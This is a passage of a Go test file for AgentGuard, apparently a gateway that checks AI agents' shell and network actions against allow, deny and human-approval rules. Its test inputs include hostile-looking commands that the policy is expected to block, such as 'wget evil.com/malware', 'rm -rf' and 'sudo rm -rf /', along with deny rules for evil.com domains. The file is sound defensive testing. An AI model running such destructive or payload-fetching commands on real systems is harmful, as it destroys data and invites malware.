package proxy

import (
	"bytes"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/Caua-ferraz/AgentGuard/pkg/audit"
	"github.com/Caua-ferraz/AgentGuard/pkg/notify"
	"github.com/Caua-ferraz/AgentGuard/pkg/policy"
)

// newTestServer builds a Server using httptest (never calls ListenAndServe).
func newTestServer(t *testing.T, opts ...func(*Config)) *Server {
	t.Helper()

	dir := t.TempDir()
	logPath := filepath.Join(dir, "test_audit.jsonl")
	logger, err := audit.NewFileLogger(logPath)
	if err != nil {
		t.Fatalf("NewFileLogger: %v", err)
	}
	t.Cleanup(func() { logger.Close() })

	pol := &policy.Policy{
		Version: "1",
		Name:    "test-policy",
		Rules: []policy.RuleSet{
			{
				Scope: "shell",
				Allow: []policy.Rule{{Pattern: "ls *"}, {Pattern: "echo *"}},
				Deny:  []policy.Rule{{Pattern: "rm -rf *", Message: "Destructive command blocked"}},
				RequireApproval: []policy.Rule{{Pattern: "sudo *"}},
			},
			{
				Scope: "network",
				Allow: []policy.Rule{{Domain: "api.openai.com"}},
				Deny:  []policy.Rule{{Domain: "*.evil.com", Message: "Blocked domain"}},
			},
		},
	}

	cfg := Config{
		Port:             0,
		Engine:           policy.NewEngine(pol),
		Logger:           logger,
		DashboardEnabled: true,
		Notifier:         notify.NewDispatcher(policy.NotificationCfg{}),
		APIKey:           "test-secret",
		BaseURL:          "http://localhost:9999",
		Version:          "test",
	}

	for _, o := range opts {
		o(&cfg)
	}

	return NewServer(cfg)
}

// --- /v1/check ---

func TestHandleCheck_Allow(t *testing.T) {
	srv := newTestServer(t)

	body := `{"scope":"shell","command":"ls -la"}`
	req := httptest.NewRequest(http.MethodPost, "/v1/check", strings.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	w := httptest.NewRecorder()

	srv.handleCheck(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", w.Code, w.Body.String())
	}

	var result policy.CheckResult
	if err := json.NewDecoder(w.Body).Decode(&result); err != nil {
		t.Fatalf("decode: %v", err)
	}
	if result.Decision != policy.Allow {
		t.Errorf("expected ALLOW, got %s (reason: %s)", result.Decision, result.Reason)
	}

	// Verify timing headers are present
	if w.Header().Get("X-AgentGuard-Total-Ms") == "" {
		t.Error("missing X-AgentGuard-Total-Ms header")
	}
}

func TestHandleCheck_Deny(t *testing.T) {
	srv := newTestServer(t)

	body := `{"scope":"shell","command":"rm -rf /tmp/data"}`
	req := httptest.NewRequest(http.MethodPost, "/v1/check", strings.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	w := httptest.NewRecorder()

	srv.handleCheck(w, req)

	var result policy.CheckResult
	_ = json.NewDecoder(w.Body).Decode(&result)
	if result.Decision != policy.Deny {
		t.Errorf("expected DENY, got %s", result.Decision)
	}
	if result.Reason != "Destructive command blocked" {
		t.Errorf("unexpected reason: %s", result.Reason)
	}
}

func TestHandleCheck_RequireApproval(t *testing.T) {
	srv := newTestServer(t)

	body := `{"scope":"shell","command":"sudo apt install vim"}`
	req := httptest.NewRequest(http.MethodPost, "/v1/check", strings.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	w := httptest.NewRecorder()

	srv.handleCheck(w, req)

	var result policy.CheckResult
	_ = json.NewDecoder(w.Body).Decode(&result)
	if result.Decision != policy.RequireApproval {
		t.Errorf("expected REQUIRE_APPROVAL, got %s", result.Decision)
	}
	if result.ApprovalID == "" {
		t.Error("expected approval_id to be set")
	}
	if !strings.HasPrefix(result.ApprovalID, "ap_") {
		t.Errorf("approval_id should start with ap_, got %s", result.ApprovalID)
	}
	if result.ApprovalURL == "" {
		t.Error("expected approval_url to be set")
	}
}

func TestHandleCheck_DefaultDeny(t *testing.T) {
	srv := newTestServer(t)

	body := `{"scope":"shell","command":"wget evil.com/malware"}`
	req := httptest.NewRequest(http.MethodPost, "/v1/check", strings.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	w := httptest.NewRecorder()

	srv.handleCheck(w, req)

	var result policy.CheckResult
	_ = json.NewDecoder(w.Body).Decode(&result)
	if result.Decision != policy.Deny {
		t.Errorf("expected default DENY, got %s", result.Decision)
	}
}

func TestHandleCheck_NetworkScope(t *testing.T) {
	srv := newTestServer(t)

	// Allowed domain
	body := `{"scope":"network","domain":"api.openai.com"}`
	req := httptest.NewRequest(http.MethodPost, "/v1/check", strings.NewReader(body))
	w := httptest.NewRecorder()
	srv.handleCheck(w, req)

	var result policy.CheckResult
	_ = json.NewDecoder(w.Body).Decode(&result)
	if result.Decision != policy.Allow {
		t.Errorf("expected ALLOW for openai, got %s", result.Decision)
	}

	// Denied domain
	body = `{"scope":"network","domain":"x.evil.com"}`
	req = httptest.NewRequest(http.MethodPost, "/v1/check", strings.NewReader(body))
	w = httptest.NewRecorder()
	srv.handleCheck(w, req)

	result = policy.CheckResult{}
	_ = json.NewDecoder(w.Body).Decode(&result)
	if result.Decision != policy.Deny {
		t.Errorf("expected DENY for evil.com, got %s", result.Decision)
	}
}

func TestHandleCheck_MethodNotAllowed(t *testing.T) {
	srv := newTestServer(t)

	req := httptest.NewRequest(http.MethodGet, "/v1/check", nil)
	w := httptest.NewRecorder()
	srv.handleCheck(w, req)

	if w.Code != http.StatusMethodNotAllowed {
		t.Errorf("expected 405, got %d", w.Code)
	}
}

func TestHandleCheck_InvalidJSON(t *testing.T) {
	srv := newTestServer(t)

	req := httptest.NewRequest(http.MethodPost, "/v1/check", strings.NewReader("not json"))
	w := httptest.NewRecorder()
	srv.handleCheck(w, req)

	if w.Code != http.StatusBadRequest {
		t.Errorf("expected 400, got %d", w.Code)
	}
}

func TestHandleCheck_OversizedBody(t *testing.T) {
	srv := newTestServer(t)

	// Create a body larger than MaxRequestBodySize (1 MB)
	bigBody := strings.Repeat("x", MaxRequestBodySize+1)
	req := httptest.NewRequest(http.MethodPost, "/v1/check", strings.NewReader(bigBody))
	w := httptest.NewRecorder()
	srv.handleCheck(w, req)

	if w.Code != http.StatusBadRequest {
		t.Errorf("expected 400 for oversized body, got %d: %s", w.Code, w.Body.String())
	}
}

// --- /v1/approve and /v1/deny ---

func TestHandleApprove(t *testing.T) {
	srv := newTestServer(t)

	// Create a pending action first
	pending := srv.approval.Add(
		policy.ActionRequest{Scope: "shell", Command: "sudo reboot"},
		policy.CheckResult{Decision: policy.RequireApproval},
	)

	// Approve it
	req := httptest.NewRequest(http.MethodPost, "/v1/approve/"+pending.ID, nil)
	req.Header.Set("Authorization", "Bearer test-secret")
	w := httptest.NewRecorder()
	srv.handleApprove(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", w.Code, w.Body.String())
	}

	var resp map[string]string
	_ = json.NewDecoder(w.Body).Decode(&resp)
	if resp["status"] != "approved" {
		t.Errorf("expected approved, got %s", resp["status"])
	}

	// Verify it's resolved
	srv.approval.mu.RLock()
	pa := srv.approval.pending[pending.ID]
	srv.approval.mu.RUnlock()
	if !pa.Resolved {
		t.Error("pending action should be resolved")
	}
	if pa.Decision != "ALLOW" {
		t.Errorf("expected ALLOW decision, got %s", pa.Decision)
	}
}

func TestHandleDeny(t *testing.T) {
	srv := newTestServer(t)

	pending := srv.approval.Add(
		policy.ActionRequest{Scope: "shell", Command: "sudo rm -rf /"},
		policy.CheckResult{Decision: policy.RequireApproval},
	)

	req := httptest.NewRequest(http.MethodPost, "/v1/deny/"+pending.ID, nil)
	req.Header.Set("Authorization", "Bearer test-secret")
	w := httptest.NewRecorder()
	srv.handleDeny(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", w.Code, w.Body.String())
	}

	var resp map[string]string
	_ = json.NewDecoder(w.Body).Decode(&resp)
	if resp["status"] != "denied" {
		t.Errorf("expected denied, got %s", resp["status"])
	}

	srv.approval.mu.RLock()
	pa := srv.approval.pending[pending.ID]
	srv.approval.mu.RUnlock()
	if pa.Decision != "DENY" {
		t.Errorf("expected DENY decision, got %s", pa.Decision)
	}
}

func TestHandleApprove_NotFound(t *testing.T) {
	srv := newTestServer(t)

	req := httptest.NewRequest(http.MethodPost, "/v1/approve/ap_nonexistent", nil)
	req.Header.Set("Authorization", "Bearer test-secret")
	w := httptest.NewRecorder()
	srv.handleApprove(w, req)

	if w.Code != http.StatusNotFound {
		t.Errorf("expected 404, got %d", w.Code)
	}
}

func TestHandleDeny_NotFound(t *testing.T) {
	srv := newTestServer(t)

	req := httptest.NewRequest(http.MethodPost, "/v1/deny/ap_nonexistent", nil)
	req.Header.Set("Authorization", "Bearer test-secret")
	w := httptest.NewRecorder()
	srv.handleDeny(w, req)

	if w.Code != http.StatusNotFound {
		t.Errorf("expected 404, got %d", w.Code)
	}
}

func TestHandleApprove_MethodNotAllowed(t *testing.T) {
	srv := newTestServer(t)

	req := httptest.NewRequest(http.MethodGet, "/v1/approve/ap_test", nil)
	w := httptest.NewRecorder()
	srv.handleApprove(w, req)

	if w.Code != http.StatusMethodNotAllowed {
		t.Errorf("expected 405, got %d", w.Code)
	}
}

// --- /v1/status ---

func TestHandleStatus_Pending(t *testing.T) {
	srv := newTestServer(t)

	pending := srv.approval.Add(
		policy.ActionRequest{Scope: "shell", Command: "sudo test"},
		policy.CheckResult{Decision: policy.RequireApproval},
	)

	req := httptest.NewRequest(http.MethodGet, "/v1/status/"+pending.ID, nil)
	w := httptest.NewRecorder()
	srv.handleStatus(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d", w.Code)
	}

	var resp map[string]string
	_ = json.NewDecoder(w.Body).Decode(&resp)
	if resp["status"] != "pending" {
		t.Errorf("expected pending, got %s", resp["status"])
	}
}

func TestHandleStatus_Resolved(t *testing.T) {
	srv := newTestServer(t)

	pending := srv.approval.Add(
		policy.ActionRequest{Scope: "shell", Command: "sudo test"},
		policy.CheckResult{Decision: policy.RequireApproval},
	)
	_ = srv.approval.Resolve(pending.ID, policy.Allow)

	req := httptest.NewRequest(http.MethodGet, "/v1/status/"+pending.ID, nil)
	w := httptest.NewRecorder()
	srv.handleStatus(w, req)

	var resp map[string]string
	_ = json.NewDecoder(w.Body).Decode(&resp)
	if resp["status"] != "resolved" {
		t.Errorf("expected resolved, got %s", resp["status"])
	}
	if resp["decision"] != "ALLOW" {
		t.Errorf("expected ALLOW, got %s", resp["decision"])
	}
}

func TestHandleStatus_NotFound(t *testing.T) {
	srv := newTestServer(t)

	req := httptest.NewRequest(http.MethodGet, "/v1/status/ap_missing", nil)
	w := httptest.NewRecorder()
	srv.handleStatus(w, req)

	if w.Code != http.StatusNotFound {
		t.Errorf("expected 404, got %d", w.Code)
	}
}

// --- /health ---

func TestHandleHealth(t *testing.T) {
	srv := newTestServer(t)

	req := httptest.NewRequest(http.MethodGet, "/health", nil)
	w := httptest.NewRecorder()
	srv.handleHealth(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d", w.Code)
	}

	var resp map[string]string
	_ = json.NewDecoder(w.Body).Decode(&resp)
	if resp["status"] != "ok" {
		t.Errorf("expected ok, got %s", resp["status"])
	}
	if resp["version"] != "test" {
		t.Errorf("expected version=test, got %s", resp["version"])
	}
}

// --- /metrics ---

func TestHandleMetrics(t *testing.T) {
	srv := newTestServer(t)

	req := httptest.NewRequest(http.MethodGet, "/metrics", nil)
	w := httptest.NewRecorder()
	srv.handleMetrics(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d", w.Code)
	}
	if !strings.Contains(w.Header().Get("Content-Type"), "text/plain") {
		t.Errorf("expected text/plain content type, got %s", w.Header().Get("Content-Type"))
	}
	body := w.Body.String()
	if !strings.Contains(body, "agentguard_") {
		t.Error("metrics response should contain agentguard_ prefixed metrics")
	}
}

// --- /v1/audit ---

func TestHandleAuditQuery(t *testing.T) {
	srv := newTestServer(t)

	// Generate some audit entries via checks
	checks := []string{
		`{"scope":"shell","command":"ls -la","agent_id":"bot-1"}`,
		`{"scope":"shell","command":"echo hello","agent_id":"bot-1"}`,
		`{"scope":"network","domain":"api.openai.com","agent_id":"bot-2"}`,
	}
	for _, body := range checks {
		r := httptest.NewRequest(http.MethodPost, "/v1/check", strings.NewReader(body))
		w := httptest.NewRecorder()
		srv.handleCheck(w, r)
	}

	// Query all
	req := httptest.NewRequest(http.MethodGet, "/v1/audit", nil)
	w := httptest.NewRecorder()
	srv.handleAuditQuery(w, req)

	var entries []audit.Entry
	_ = json.NewDecoder(w.Body).Decode(&entries)
	if len(entries) != 3 {
		t.Errorf("expected 3 audit entries, got %d", len(entries))
	}

	// Query by agent
	req = httptest.NewRequest(http.MethodGet, "/v1/audit?agent_id=bot-1", nil)
	w = httptest.NewRecorder()
	srv.handleAuditQuery(w, req)

	entries = nil
	_ = json.NewDecoder(w.Body).Decode(&entries)
	if len(entries) != 2 {
		t.Errorf("expected 2 entries for bot-1, got %d", len(entries))
	}

	// Query by scope
	req = httptest.NewRequest(http.MethodGet, "/v1/audit?scope=network", nil)
	w = httptest.NewRecorder()
	srv.handleAuditQuery(w, req)

	entries = nil
	_ = json.NewDecoder(w.Body).Decode(&entries)
	if len(entries) != 1 {
		t.Errorf("expected 1 network entry, got %d", len(entries))
	}
}

// --- Dashboard ---

func TestHandleDashboard(t *testing.T) {
	srv := newTestServer(t)

	req := httptest.NewRequest(http.MethodGet, "/dashboard", nil)
	w := httptest.NewRecorder()
	srv.handleDashboard(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d", w.Code)
	}
	if !strings.Contains(w.Header().Get("Content-Type"), "text/html") {
		t.Error("expected text/html content type")
	}
	if w.Header().Get("Cache-Control") != "no-store" {
		t.Error("expected Cache-Control: no-store")
	}
	body := w.Body.String()
	if !strings.Contains(body, "AgentGuard Dashboard") {
		t.Error("dashboard should contain title")
	}
	// Verify XSS fix: no innerHTML assignments for user data
	if strings.Contains(body, ".innerHTML = `") {
		t.Error("dashboard should not use innerHTML with template literals (XSS risk)")
	}
}

func TestHandleDashboard_APIKeyMetaTag(t *testing.T) {
	srv := newTestServer(t) // has APIKey: "test-secret"

	req := httptest.NewRequest(http.MethodGet, "/dashboard", nil)
	w := httptest.NewRecorder()
	srv.handleDashboard(w, req)

	body := w.Body.String()
	if !strings.Contains(body, `<meta name="agentguard-api-key" content="test-secret">`) {
		t.Error("dashboard should contain API key meta tag when APIKey is set")
	}
}

func TestHandleDashboard_NoMetaTagWithoutAPIKey(t *testing.T) {
	srv := newTestServer(t, func(c *Config) { c.APIKey = "" })

	req := httptest.NewRequest(http.MethodGet, "/dashboard", nil)
	w := httptest.NewRecorder()
	srv.handleDashboard(w, req)

	body := w.Body.String()
	if strings.Contains(body, `<meta name="agentguard-api-key"`) {
		t.Error("dashboard should NOT contain API key meta tag when APIKey is empty")
	}
}

func TestHandleApprove_NoAuthHeader(t *testing.T) {
	srv := newTestServer(t) // has APIKey: "test-secret"

	pending := srv.approval.Add(
		policy.ActionRequest{Scope: "shell", Command: "sudo reboot"},
		policy.CheckResult{Decision: policy.RequireApproval},
	)

	// No Authorization header
	req := httptest.NewRequest(http.MethodPost, "/v1/approve/"+pending.ID, nil)
	w := httptest.NewRecorder()

	// Must go through requireAuth middleware
	handler := requireAuth(srv.cfg.APIKey, srv.handleApprove)
	handler(w, req)

	if w.Code != http.StatusUnauthorized {
		t.Errorf("expected 401 without auth header, got %d", w.Code)
	}
}

func TestHandleDeny_NoAuthHeader(t *testing.T) {
	srv := newTestServer(t)

	pending := srv.approval.Add(
		policy.ActionRequest{Scope: "shell", Command: "sudo halt"},
		policy.CheckResult{Decision: policy.RequireApproval},
	)

	req := httptest.NewRequest(http.MethodPost, "/v1/deny/"+pending.ID, nil)
	w := httptest.NewRecorder()

	handler := requireAuth(srv.cfg.APIKey, srv.handleDeny)
	handler(w, req)

	if w.Code != http.StatusUnauthorized {
		t.Errorf("expected 401 without auth header, got %d", w.Code)
	}
}

// --- /api/pending ---

func TestHandlePendingList(t *testing.T) {
	srv := newTestServer(t)

	// No pending actions
	req := httptest.NewRequest(http.MethodGet, "/api/pending", nil)
	w := httptest.NewRecorder()
	srv.handlePendingList(w, req)

	var list []*PendingAction
	_ = json.NewDecoder(w.Body).Decode(&list)
	if len(list) != 0 {
		t.Errorf("expected 0 pending, got %d", len(list))
	}

	// Add pending actions
	srv.approval.Add(
		policy.ActionRequest{Scope: "shell", Command: "sudo reboot"},
		policy.CheckResult{Decision: policy.RequireApproval},
	)
	srv.approval.Add(
		policy.ActionRequest{Scope: "shell", Command: "sudo halt"},
		policy.CheckResult{Decision: policy.RequireApproval},
	)

	req = httptest.NewRequest(http.MethodGet, "/api/pending", nil)
	w = httptest.NewRecorder()
	srv.handlePendingList(w, req)

	list = nil
	_ = json.NewDecoder(w.Body).Decode(&list)
	if len(list) != 2 {
		t.Errorf("expected 2 pending, got %d", len(list))
	}
}

// --- /api/stats ---

func TestHandleStats(t *testing.T) {
	srv := newTestServer(t)

	req := httptest.NewRequest(http.MethodGet, "/api/stats", nil)
	w := httptest.NewRecorder()
	srv.handleStats(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d", w.Code)
	}

	var stats map[string]uint64
	_ = json.NewDecoder(w.Body).Decode(&stats)
	if _, ok := stats["total"]; !ok {
		t.Error("stats should contain 'total' key")
	}
	if _, ok := stats["allowed"]; !ok {
		t.Error("stats should contain 'allowed' key")
	}
	if _, ok := stats["denied"]; !ok {
		t.Error("stats should contain 'denied' key")
	}
}

// --- Auth middleware ---

func TestRequireAuth_ValidKey(t *testing.T) {
	called := false
	handler := requireAuth("secret", func(w http.ResponseWriter, r *http.Request) {
		called = true
		w.WriteHeader(http.StatusOK)
	})

	req := httptest.NewRequest(http.MethodPost, "/test", nil)
	req.Header.Set("Authorization", "Bearer secret")
	w := httptest.NewRecorder()
	handler(w, req)

	if !called {
		t.Error("handler should have been called")
	}
	if w.Code != http.StatusOK {
		t.Errorf("expected 200, got %d", w.Code)
	}
}

func TestRequireAuth_InvalidKey(t *testing.T) {
	called := false
	handler := requireAuth("secret", func(w http.ResponseWriter, r *http.Request) {
		called = true
	})

	req := httptest.NewRequest(http.MethodPost, "/test", nil)
	req.Header.Set("Authorization", "Bearer wrong-key")
	w := httptest.NewRecorder()
	handler(w, req)

	if called {
		t.Error("handler should NOT have been called with wrong key")
	}
	if w.Code != http.StatusUnauthorized {
		t.Errorf("expected 401, got %d", w.Code)
	}
}

func TestRequireAuth_NoKey(t *testing.T) {
	called := false
	handler := requireAuth("", func(w http.ResponseWriter, r *http.Request) {
		called = true
		w.WriteHeader(http.StatusOK)
	})

	req := httptest.NewRequest(http.MethodPost, "/test", nil)
	w := httptest.NewRecorder()
	handler(w, req)

	if !called {
		t.Error("handler should be called when no API key is configured")
	}
}

func TestRequireAuth_MalformedHeader(t *testing.T) {
	handler := requireAuth("secret", func(w http.ResponseWriter, r *http.Request) {
		t.Error("handler should NOT be called with malformed header")
	})

	// No "Bearer " prefix
	req := httptest.NewRequest(http.MethodPost, "/test", nil)
	req.Header.Set("Authorization", "secret")
	w := httptest.NewRecorder()
	handler(w, req)

	if w.Code != http.StatusUnauthorized {
		t.Errorf("expected 401, got %d", w.Code)
	}
}

func TestNewServer_HasHTTPTimeouts(t *testing.T) {
	srv := newTestServer(t)

	if srv.http.ReadHeaderTimeout == 0 {
		t.Error("ReadHeaderTimeout should be set (Slowloris protection)")
	}
	if srv.http.ReadTimeout == 0 {
		t.Error("ReadTimeout should be set")
	}
	if srv.http.WriteTimeout == 0 {
		t.Error("WriteTimeout should be set")
	}
	if srv.http.IdleTimeout == 0 {
		t.Error("IdleTimeout should be set")
	}
}

// --- CORS middleware ---

func TestCORS_LocalhostAllowed(t *testing.T) {
	handler := withCORS("")(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
	}))

	req := httptest.NewRequest(http.MethodGet, "/test", nil)
	req.Header.Set("Origin", "http://localhost:3000")
	w := httptest.NewRecorder()
	handler.ServeHTTP(w, req)

	if w.Header().Get("Access-Control-Allow-Origin") != "http://localhost:3000" {
		t.Error("expected localhost origin to be allowed")
	}
}

func TestCORS_ExternalBlocked(t *testing.T) {
	handler := withCORS("")(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
	}))

	req := httptest.NewRequest(http.MethodGet, "/test", nil)
	req.Header.Set("Origin", "https://evil.com")
	w := httptest.NewRecorder()
	handler.ServeHTTP(w, req)

	if w.Header().Get("Access-Control-Allow-Origin") != "" {
		t.Error("external origin should not be allowed")
	}
}

func TestCORS_CustomOrigin(t *testing.T) {
	handler := withCORS("https://myapp.com")(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
	}))

	req := httptest.NewRequest(http.MethodGet, "/test", nil)
	req.Header.Set("Origin", "https://myapp.com")
	w := httptest.NewRecorder()
	handler.ServeHTTP(w, req)

	if w.Header().Get("Access-Control-Allow-Origin") != "https://myapp.com" {
		t.Error("custom origin should be allowed")
	}
}

func TestCORS_Preflight(t *testing.T) {
	handler := withCORS("")(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusTeapot) // should not reach here
	}))

	req := httptest.NewRequest(http.MethodOptions, "/v1/check", nil)
	req.Header.Set("Origin", "http://localhost:8080")
	w := httptest.NewRecorder()
	handler.ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Errorf("preflight should return 200, got %d", w.Code)
	}
}

// --- ApprovalQueue ---

func TestApprovalQueue_AddAndList(t *testing.T) {
	q := &ApprovalQueue{pending: make(map[string]*PendingAction)}

	pa1 := q.Add(
		policy.ActionRequest{Scope: "shell", Command: "sudo test1"},
		policy.CheckResult{Decision: policy.RequireApproval},
	)
	pa2 := q.Add(
		policy.ActionRequest{Scope: "shell", Command: "sudo test2"},
		policy.CheckResult{Decision: policy.RequireApproval},
	)

	if !strings.HasPrefix(pa1.ID, "ap_") {
		t.Errorf("ID should start with ap_, got %s", pa1.ID)
	}
	if pa1.ID == pa2.ID {
		t.Error("IDs should be unique")
	}

	list := q.List()
	if len(list) != 2 {
		t.Errorf("expected 2 pending, got %d", len(list))
	}
}

func TestApprovalQueue_ResolveRemovesFromList(t *testing.T) {
	q := &ApprovalQueue{pending: make(map[string]*PendingAction)}

	pa := q.Add(
		policy.ActionRequest{Scope: "shell", Command: "sudo test"},
		policy.CheckResult{Decision: policy.RequireApproval},
	)

	if err := q.Resolve(pa.ID, policy.Allow); err != nil {
		t.Fatalf("Resolve: %v", err)
	}

	// Resolved actions should not appear in List()
	list := q.List()
	if len(list) != 0 {
		t.Errorf("expected 0 pending after resolve, got %d", len(list))
	}
}

func TestApprovalQueue_EvictsResolved(t *testing.T) {
	q := &ApprovalQueue{pending: make(map[string]*PendingAction)}

	// Add and resolve entries to fill the map
	for i := 0; i < MaxPendingApprovals; i++ {
		pa := q.Add(
			policy.ActionRequest{Scope: "shell", Command: "sudo test"},
			policy.CheckResult{Decision: policy.RequireApproval},
		)
		_ = q.Resolve(pa.ID, policy.Allow)
	}

	// Map should be at capacity (resolved entries are still in the map)
	q.mu.RLock()
	sizeBefore := len(q.pending)
	q.mu.RUnlock()
	if sizeBefore != MaxPendingApprovals {
		t.Fatalf("expected %d entries before eviction, got %d", MaxPendingApprovals, sizeBefore)
	}

	// Adding one more should trigger eviction of resolved entries
	q.Add(
		policy.ActionRequest{Scope: "shell", Command: "sudo new"},
		policy.CheckResult{Decision: policy.RequireApproval},
	)

	q.mu.RLock()
	sizeAfter := len(q.pending)
	q.mu.RUnlock()

	// All resolved entries evicted, only the new one remains
	if sizeAfter != 1 {
		t.Errorf("expected 1 entry after eviction, got %d", sizeAfter)
	}
}

func TestApprovalQueue_ResolveNotFound(t *testing.T) {
	q := &ApprovalQueue{pending: make(map[string]*PendingAction)}

	err := q.Resolve("ap_nonexistent", policy.Allow)
	if err == nil {
		t.Error("expected error for non-existent ID")
	}
}

func TestApprovalQueue_SSEBroadcast(t *testing.T) {
	q := &ApprovalQueue{pending: make(map[string]*PendingAction)}

	ch := q.Subscribe()
	defer q.Unsubscribe(ch)

	// Add should trigger a broadcast via Resolve
	pa := q.Add(
		policy.ActionRequest{Scope: "shell", Command: "sudo test"},
		policy.CheckResult{Decision: policy.RequireApproval},
	)
	_ = q.Resolve(pa.ID, policy.Allow)

	select {
	case event := <-ch:
		if event.Type != "resolved" {
			t.Errorf("expected resolved event, got %s", event.Type)
		}
	case <-time.After(time.Second):
		t.Error("expected SSE event within 1 second")
	}
}

// --- Full round-trip: check → approve → status ---

func TestFullApprovalRoundTrip(t *testing.T) {
	srv := newTestServer(t)

	// Step 1: Check returns REQUIRE_APPROVAL
	checkBody := `{"scope":"shell","command":"sudo reboot","agent_id":"agent-1"}`
	checkReq := httptest.NewRequest(http.MethodPost, "/v1/check", strings.NewReader(checkBody))
	checkW := httptest.NewRecorder()
	srv.handleCheck(checkW, checkReq)

	var checkResult policy.CheckResult
	_ = json.NewDecoder(checkW.Body).Decode(&checkResult)
	if checkResult.Decision != policy.RequireApproval {
		t.Fatalf("step 1: expected REQUIRE_APPROVAL, got %s", checkResult.Decision)
	}

	approvalID := checkResult.ApprovalID

	// Step 2: Poll status — should be pending
	statusReq := httptest.NewRequest(http.MethodGet, "/v1/status/"+approvalID, nil)
	statusW := httptest.NewRecorder()
	srv.handleStatus(statusW, statusReq)

	var statusResp map[string]string
	_ = json.NewDecoder(statusW.Body).Decode(&statusResp)
	if statusResp["status"] != "pending" {
		t.Fatalf("step 2: expected pending, got %s", statusResp["status"])
	}

	// Step 3: Approve
	approveReq := httptest.NewRequest(http.MethodPost, "/v1/approve/"+approvalID, nil)
	approveReq.Header.Set("Authorization", "Bearer test-secret")
	approveW := httptest.NewRecorder()
	srv.handleApprove(approveW, approveReq)

	if approveW.Code != http.StatusOK {
		t.Fatalf("step 3: expected 200, got %d", approveW.Code)
	}

	// Step 4: Poll status — should be resolved
	statusReq2 := httptest.NewRequest(http.MethodGet, "/v1/status/"+approvalID, nil)
	statusW2 := httptest.NewRecorder()
	srv.handleStatus(statusW2, statusReq2)

	statusResp2 := map[string]string{}
	_ = json.NewDecoder(statusW2.Body).Decode(&statusResp2)
	if statusResp2["status"] != "resolved" {
		t.Fatalf("step 4: expected resolved, got %s", statusResp2["status"])
	}
	if statusResp2["decision"] != "ALLOW" {
		t.Fatalf("step 4: expected ALLOW, got %s", statusResp2["decision"])
	}

	// Step 5: Verify audit log has the entry
	auditReq := httptest.NewRequest(http.MethodGet, "/v1/audit?agent_id=agent-1", nil)
	auditW := httptest.NewRecorder()
	srv.handleAuditQuery(auditW, auditReq)

	var auditEntries []audit.Entry
	_ = json.NewDecoder(auditW.Body).Decode(&auditEntries)
	if len(auditEntries) < 1 {
		t.Error("step 5: expected at least 1 audit entry for agent-1")
	}
}

// --- Full round-trip: check → deny → status ---

func TestFullDenyRoundTrip(t *testing.T) {
	srv := newTestServer(t)

	// Step 1: Check returns REQUIRE_APPROVAL
	checkBody := `{"scope":"shell","command":"sudo halt","agent_id":"agent-2"}`
	checkReq := httptest.NewRequest(http.MethodPost, "/v1/check", strings.NewReader(checkBody))
	checkW := httptest.NewRecorder()
	srv.handleCheck(checkW, checkReq)

	var checkResult policy.CheckResult
	_ = json.NewDecoder(checkW.Body).Decode(&checkResult)
	approvalID := checkResult.ApprovalID

	// Step 2: Deny
	denyReq := httptest.NewRequest(http.MethodPost, "/v1/deny/"+approvalID, nil)
	denyReq.Header.Set("Authorization", "Bearer test-secret")
	denyW := httptest.NewRecorder()
	srv.handleDeny(denyW, denyReq)

	if denyW.Code != http.StatusOK {
		t.Fatalf("deny: expected 200, got %d", denyW.Code)
	}

	// Step 3: Status should be denied
	statusReq := httptest.NewRequest(http.MethodGet, "/v1/status/"+approvalID, nil)
	statusW := httptest.NewRecorder()
	srv.handleStatus(statusW, statusReq)

	var resp map[string]string
	_ = json.NewDecoder(statusW.Body).Decode(&resp)
	if resp["decision"] != "DENY" {
		t.Errorf("expected DENY, got %s", resp["decision"])
	}
}

// --- Verify localhost binding when no API key ---

func TestNewServer_LocalhostBindingWithoutAPIKey(t *testing.T) {
	dir := t.TempDir()
	logPath := filepath.Join(dir, "audit.jsonl")
	logger, _ := audit.NewFileLogger(logPath)
	defer logger.Close()

	pol := &policy.Policy{Version: "1", Name: "test", Rules: []policy.RuleSet{}}

	srv := NewServer(Config{
		Port:    8080,
		Engine:  policy.NewEngine(pol),
		Logger:  logger,
		APIKey:  "", // No API key
		Version: "test",
	})

	if !strings.Contains(srv.http.Addr, "127.0.0.1") {
		t.Errorf("without API key, should bind to 127.0.0.1, got %s", srv.http.Addr)
	}
}

func TestNewServer_AllInterfaceBindingWithAPIKey(t *testing.T) {
	dir := t.TempDir()
	logPath := filepath.Join(dir, "audit.jsonl")
	logger, _ := audit.NewFileLogger(logPath)
	defer logger.Close()

	pol := &policy.Policy{Version: "1", Name: "test", Rules: []policy.RuleSet{}}

	srv := NewServer(Config{
		Port:    8080,
		Engine:  policy.NewEngine(pol),
		Logger:  logger,
		APIKey:  "my-secret",
		Version: "test",
	})

	if strings.Contains(srv.http.Addr, "127.0.0.1") {
		t.Errorf("with API key, should bind to all interfaces, got %s", srv.http.Addr)
	}
}

// --- Verify XSS mitigation in dashboard ---

func TestDashboard_NoUnsafeInnerHTML(t *testing.T) {
	// Ensure the dashboard HTML doesn't use innerHTML for user-controlled data.
	// Safe patterns: textContent, createElement, esc() helper.
	// Unsafe pattern: .innerHTML = ` (template literal with interpolation)
	if strings.Contains(dashboardHTML, ".innerHTML = `") {
		t.Error("dashboard contains .innerHTML with template literal — XSS risk")
	}

